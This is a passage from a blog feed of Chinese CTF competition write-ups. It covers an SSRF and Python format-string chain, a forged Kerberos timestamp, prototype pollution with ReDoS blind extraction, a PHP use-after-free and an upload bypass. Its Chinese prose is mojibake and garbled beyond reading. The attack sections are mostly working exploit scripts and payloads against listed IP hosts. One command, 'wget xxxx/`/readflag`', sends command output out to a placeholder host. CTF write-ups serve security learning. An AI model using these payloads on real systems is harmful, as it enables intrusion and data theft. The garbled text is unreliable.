<p>å‘ç°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span><br></pre></td></tr></table></figure><br>ä¼ å…¥<code>begin=%s%</code>ï¼Œå¯ä»¥è¯»åˆ°outputï¼Œäºæ˜¯å¾—åˆ°æœ‰å›æ˜¾SSRF<br>æ‰«æå†…ç½‘å‘ç°8080ç«¯å£å¼€æ”¾<br><img src="/img/fmkq1.png" alt="fmkq"><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=/etc/passwd%26vipcode%3d0&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure><br>é€šè¿‡è¿™ä¸ªæ¥å£è‡ªå¸¦çš„åˆ—ç›®å½•åŠŸèƒ½å¯ä»¥å‘ç°flagåœ¨</p>
<p>ä½†æ˜¯ä¸èƒ½ç›´æ¥è¯»<br>ä½†æ˜¯å¦‚æœfileå‚æ•°ä¼ å…¥{file}æ—¶ä¼šè¢«è§£ææˆerrorï¼Œå°è¯•{file.<strong>class</strong>}ä¹‹åç¡®å®šåç«¯ä¸ºpythonä¸”å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p>å­˜ç”¨<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=&#123;file.__class__.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode=&#123;file&#125;&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure><br>å¯è¯»å–åˆ°vipcodeçš„å€¼<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'vipcode': 'uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL</span><br></pre></td></tr></table></figure><br>æœ‰äº†vipcodeå¯ä»¥è¯»å–æºç å’Œåˆ—ç›®å½•ï¼ŒçŸ¥é“flagåœ¨<code>/fl4g_1s_h3re_u_wi11_rua</code>é‡Œï¼Œä½†æ˜¯è¯»ä¸äº†ï¼Œäºæ˜¯è¯»å–é¡¹ç›®ä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<p>/app/base/readfile.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br><span class="line">```     </span><br><span class="line">/app/base/vip.py</span><br><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span>:</span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.truevipcode</span><br></pre></td></tr></table></figure><br>/app/app.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> web</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> base.readfile <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">urls = (</span><br><span class="line">    <span class="string">'/'</span>, <span class="string">'help'</span>,</span><br><span class="line">    <span class="string">'/read/(.*)'</span>,<span class="string">'read'</span></span><br><span class="line">)</span><br><span class="line">web.config.debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">help</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        help_information = <span class="string">'''</span></span><br><span class="line"><span class="string">        Welcome to our FMKQ api, you could use the help information below</span></span><br><span class="line"><span class="string">        To read file:</span></span><br><span class="line"><span class="string">            /read/file=example&amp;vipcode=example</span></span><br><span class="line"><span class="string">            if you are not vip,let vipcode=0,and you can only read /tmp/&#123;file&#125;</span></span><br><span class="line"><span class="string">        Other functions only for the vip!!!</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span> help_information</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GET</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        file2read = readfile(text)</span><br><span class="line">        <span class="keyword">if</span> file2read.test() == <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> file2read.isvip() == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">"The content of "</span>+ file2read.GetFileName() +<span class="string">" is &#123;file&#125;"</span>).format(file=file2read)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                vipfile2read = vipreadfile(file2read)</span><br><span class="line">                <span class="keyword">return</span> (str(vipfile2read))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = web.application(urls, globals())</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure></p>
<p>pathä¸­ä¸èƒ½æœ‰fl4gï¼Œä½†æ˜¯è¯»å–flagå¿…å®šä¼šå§ä¸Šä¸€çº§å½“æˆpathï¼Œ<br>å‘ç°vipfileå’Œfileä¸€æ ·å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæƒ³åˆ°æ„é€ ä¸€ä¸ªfç»•è¿‡å¯¹fl4gçš„è¿‡æ»¤ï¼Œ<br>payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:8080/read/file=&#123;vipfile.__class__.__init__.__globals__[vipreadfile].__module__[9]&#125;l4g_1s_h3re_u_wi11_rua/flag%26vipcode=uJvFXyqiHnztNQBU10TYkepKjAh7xVMfmgdS4G9r5sWa6loL&amp;head=\&amp;begin=%s%</span><br></pre></td></tr></table></figure></p>
<p>flag:<br>flag{qoSF2nKvwoGRI7aJ}</p>
<h2 id="Dooog"><a href="#Dooog" class="headerlink" title="Dooog"></a>Dooog</h2><p>é€šè¯»ä»£ç ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªkerberosåè®®<br>æ ¸å¿ƒå°±æ˜¯ä¼ªé€ ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œç»•è¿‡å¯¹cmdçš„éªŒè¯<br><img src="/img/dooog1.png" alt="dooog"><br>ç„¶åç›´æ¥/readflag<br>expï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    username =<span class="string">"xishir"</span></span><br><span class="line">    master_key = <span class="string">"12345678"</span></span><br><span class="line">    cmd = <span class="string">"wget xxxx/`/readflag`"</span></span><br><span class="line">    cryptor = AESCipher(master_key)</span><br><span class="line">    authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">    res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, data=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">    <span class="keyword">print</span> res.text</span><br><span class="line">    session_key, TGT = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">    cryptor = AESCipher(session_key)</span><br><span class="line">    authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: int(time.time())<span class="number">-61</span>&#125;))</span><br><span class="line">    res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  data=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: TGT&#125;)</span><br><span class="line">    <span class="keyword">print</span> res.text</span><br><span class="line">    client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line"></span><br><span class="line">    session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">    </span><br><span class="line">    cryptor = AESCipher(session_key)</span><br><span class="line">    authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">    res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, data=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="GuessGame"><a href="#GuessGame" class="headerlink" title="GuessGame"></a>GuessGame</h2><p><a href="http://121.37.179.47:8081/static/app.js" target="_blank" rel="noopener">http://121.37.179.47:8081/static/app.js</a> æœ‰åç«¯æºç </p>
<p>ç”¨<code>ADmin888</code>å¤§å°å†™ç»•è¿‡adminçš„æ£€æŸ¥ï¼Œ<br>mergeå­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼Œå¯ä»¥æŠŠconfig.enableRegæ”¹æˆtrueï¼Œ<br>æ„é€ <br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;user&quot;:&#123;&quot;username&quot;:&quot;ADmin888&quot;,&quot;__proto__&quot;: &#123;&quot;enableReg&quot;: true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><br>ç„¶åå¯ä»¥æ§åˆ¶è¿›è¡Œä¸€æ¬¡æ­£åˆ™åŒ¹é…ï¼Œå› ä¸ºæ²¡æœ‰ä»»ä½•å›æ˜¾ï¼ŒçŒœæµ‹æ˜¯è¦redosè¿›è¡Œå»¶æ—¶ç›²æ³¨<br><img src="/img/guess.png" alt="guess"></p>
<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"g3"</span></span><br><span class="line">ext = <span class="string">"zY"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    alls = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> <span class="string">"&#123;&#125;_0123456789abcdefghijklmnopqestuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>:</span><br><span class="line">        t = time.time()</span><br><span class="line">        headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">        payload = <span class="string">"""&#123;"q":"^((.*)+)+[^%s]%s$","tmp":"%d"&#125;"""</span> % (f, ext, t)</span><br><span class="line">        <span class="comment">#payload = """&#123;"q":"^(((.*)+?)+?)+?[^%s]%s$","tmp":"%d"&#125;""" % (f, ext, t)</span></span><br><span class="line">        <span class="comment">#print payload</span></span><br><span class="line">        r = requests.post(url=<span class="string">"http://121.37.179.47:8081/verifyFlag"</span>, headers=headers, data=payload)</span><br><span class="line">        tt = time.time() - t</span><br><span class="line">        alls.append(&#123;<span class="string">"time"</span>:tt,<span class="string">"v"</span>:f&#125;)</span><br><span class="line">        <span class="keyword">print</span> f,tt,r,len(r.text),payload</span><br><span class="line"></span><br><span class="line">    alls.sort()</span><br><span class="line">    ext = alls[<span class="number">-1</span>][<span class="string">"v"</span>] + ext</span><br><span class="line">    <span class="keyword">print</span> alls[<span class="number">-3</span>:]</span><br><span class="line">    <span class="keyword">print</span> i, flag, ext</span><br></pre></td></tr></table></figure><br>æˆ‘åšè¿™é¢˜çš„æ—¶å€™æœåŠ¡å™¨ä¸€è§¦å‘redoså°±æŒ‚ï¼ŒæŒ‚ä¸€å°è·‘ä¸€ä½å‡ºæ¥ï¼ˆè¿ç»´å¤§å“¥åˆ«æ‰“æˆ‘<br>æœ€åè·‘å‡ºç»“æœ<code>g3tFLAaGEAxY</code>ï¼Œæ‹¿äº†ä¸€è¡€ã€‚<br>flagï¼šflag{g3tFLAaGEAxY}</p>
<p>åæ¥å‘ç°é¢˜ç›®è¶…æ—¶å°±æ–­å¼€äº†ï¼Œæ›´å®¹æ˜“è·‘äº†ã€‚ã€‚</p>
<h2 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h2><p>PHP 7.4.2ï¼Œç›´æ¥ç”¨ç°æˆexpæ‰“<br><a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a><br><img src="/img/uaf1.png" alt="uaf1"><br><img src="/img/uaf2.png" alt="uaf2"></p>
<h2 id="happyvacation"><a href="#happyvacation" class="headerlink" title="happyvacation"></a>happyvacation</h2><p><a href="http://159.138.4.209:1002/.git" target="_blank" rel="noopener">http://159.138.4.209:1002/.git</a> gitæ³„éœ²æºç <br>å®¡è®¡ä»£ç å‘ç°ç­”é¢˜çš„åœ°æ–¹æœ‰ä¸ªevalï¼Œanswerå‚æ•°æœ‰å‡ ä¸ªè¿‡æ»¤ï¼Œä¸èƒ½ç›´æ¥å‘½ä»¤æ³¨å…¥<br><img src="/img/hv1.png" alt="hv1"><br>ä½†æ˜¯çœ‹åˆ°this-&gt;userå¼•å…¥äº†ä¸Šä¸€å±‚çš„$userï¼Œæƒ³åˆ°å¦å¤–è¿˜æœ‰ä¸ªä¸Šä¼ ç‚¹ï¼Œäºæ˜¯æ„é€ <br><img src="/img/hv2.png" alt="hv2"><br>æŠŠuploaderä¸­çš„ä¸Šä¼ åç¼€é»‘åå•æ¸…é™¤ï¼Œå°±èƒ½ä¸Šä¼ phpæ–‡ä»¶äº†<br><img src="/img/hv3.png" alt="hv3"><br><img src="/img/hv4.png" alt="hv4"><br>æœ€åç›´æ¥è¯»å–/flag<br><img src="/img/hv5.png" alt="hv5"></p>
<p>æ‰€ä»¥æç¤ºé‡Œçš„botæ˜¯å•¥ç©æ„ï¼Ÿ</p>
<p>è‡ªæ¬ºæ¬ºäººmd5éªŒè¯ç åˆæ˜¯å•¥ç©æ„ï¼Ÿ<br><img src="/img/hv6.png" alt="hv6"></p>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>åˆæ˜¯å¥½ä¹…æ²¡æœ‰è¿™ä¹ˆè‚ä¸€åœºæ¯”èµ›äº†ï¼Œæœ€åæ‹¿äº†ç¬¬äºŒåï¼Œç»™é˜Ÿé‡Œçš„å¸ˆå‚…ä»¬é€’èŒ¶ï¼</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è¿™å‘¨æœ«é‡ä¸Šé«˜æ ¡æˆ˜â€œç–«â€èµ›ï¼Œæ‰“äº†ä¸¤å¤©ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„å’Œå‚ä¸åšçš„å‡ é“é¢˜&lt;br&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>2019 SCTF éƒ¨åˆ† WriteUp</title>
    <link href="https://www.codemonster.cn/2019/06/24/2019-sctf-writeup/"/>
    <id>https://www.codemonster.cn/2019/06/24/2019-sctf-writeup/</id>
    <published>2019-06-24T06:42:59.000Z</published>
    <updated>2019-06-24T09:29:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>åˆšåˆšæ¯•ä¸šï¼Œæ­£å¥½å‘¨æœ«é‡ä¸ŠSCTFï¼Œæ‰“äº†ä¸¤å¤©ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„å‡ é“é¢˜<br><a id="more"></a></p>
<h2 id="math-is-fun1"><a href="#math-is-fun1" class="headerlink" title="math-is-fun1"></a>math-is-fun1</h2><p>é¢˜ç›®ç»™äº†ä¸ªåœ¨çº¿ç¼–è¾‘å™¨<br><a href="http://47.110.128.101/challenge?name=Challenger" target="_blank" rel="noopener">http://47.110.128.101/challenge?name=Challenger</a><br>å¯ä»¥æäº¤ä¸€ä¸ªurlåˆ°æœåŠ¡å™¨ï¼Œç»“åˆhintç¡®å®šæ˜¯è¦xssäº†<br><a href="http://47.110.128.101/send_message.html" target="_blank" rel="noopener">http://47.110.128.101/send_message.html</a></p>
<p>å¯ç”¨äº†Dompurifyï¼Œä¸”é…ç½®æ–‡ä»¶<a href="http://47.110.128.101/config" target="_blank" rel="noopener">http://47.110.128.101/config</a> å¦‚ä¸‹<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(&#123;"SAFE_FOR_JQUERY":true,"ALLOWED_TAGS":["style","img","video"],"ALLOWE</span><br><span class="line">D_ATTR":["style","src","href"],"FORBID_TAGS":["base","svg","link","iframe","frame","embed"]&#125;)</span><br></pre></td></tr></table></figure><br>åˆ†æäº†é¡µé¢é‡Œçš„jsä»£ç <br>æ¸²æŸ“æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>æœåŠ¡å™¨å°†nameå‚æ•°æ‹¼æ¥åˆ°ä¸€ä¸ªconfigç±»å‹çš„scriptæ ‡ç­¾ä¸­</li>
<li>è¯»å–ä¸Šé¢é‚£ä¸ªæ ‡ç­¾çš„å†…å®¹å¹¶è§£æç„¶åç»™window[]èµ‹å€¼ ï¼ˆè¿™é‡Œå¯ä»¥å˜é‡è¦†ç›–ï¼‰</li>
<li>å°†config[name]æ‹¼æ¥åˆ°textareaä¸­</li>
<li>è¯»å–location.searchä¸­çš„textï¼ŒURLdecodeåè¦†ç›–textarea</li>
<li>ç›‘å¬textareaå˜åŒ–åä¼šæ‰§è¡Œå¦‚ä¸‹äº‹ä»¶<ul>
<li>è¯»å–textareaçš„å†…å®¹</li>
<li>Dompurifyè¿‡æ»¤ ï¼ˆä¸Šé¢å‘çš„å…ˆçŸ¥é“¾æ¥å·²ç»è¢«ä¿®å¤ï¼‰</li>
<li>markdownæ¸²æŸ“ ï¼ˆä¸çŸ¥é“ç”¨çš„å•¥åº“ï¼‰</li>
<li>latexæ¸²æŸ“ ï¼ˆç”¨çš„mathjax2.7.5ä¸å­˜åœ¨å·²çŸ¥xssï¼‰</li>
<li>æ’å…¥é¡µé¢</li>
</ul>
</li>
</ul>
